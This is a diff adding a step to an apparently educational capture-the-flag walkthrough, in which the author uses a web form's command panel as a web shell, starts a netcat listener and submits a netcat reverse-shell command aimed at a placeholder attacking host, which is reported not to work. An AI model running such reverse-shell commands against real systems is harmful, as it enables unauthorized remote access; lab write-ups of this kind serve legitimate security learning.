@@ -66,6 +66,18 @@
                 <p>The contents of the nikto scan output file has this line "+ GET /login.php: Admin login page/section found.". Let us see if we can request that page, and if so, enter what we now believe to be valid credentials. What do you know, it worked, we are now logged in...</p>
                 <img src="pickle_landing.png" alt="Solution screenshot">
             </section>
+
+            <section id="Three">
+                <h2>Step Three</h2>
+                <p>We now have a active session on the site. Not only that, but we have been greeted with a ruddy web form with an input that is labelled as "Command Panel". Will this form execute shell commands for us? Let us try, enter "whoami" and hit enter...</p>
+                <img src="pickle_form.png" alt="Solution screenshot">
+                <p>We effectively have a web shell. "whoami" is showing we are currently logged in as "www-data". This is good. However, "www-data" is the commonly the user created when the web server software is installed and therefore, is typically, a low-privileged user created specifically for running web server processes. I wonder if we can submit the form with a command to open a network connection and execute a shell? Let us try with netcat. First we need a listener on our local/attacking machine.. </p>
+                <pre><code>case@local:~$ sudo nc -lvnp 444</code></pre>
+                <p>Now submit the command..</p>
+                <pre><code>nc attacking_ip_address choosen_port -e /bin/bash</code></pre>
+                <p>It did not work....</p>
+                <img src="sad_morty.jpeg" alt="Solution screenshot">
+            </section>
             
             <section id="solution">
                 <h2>Solution</h2>
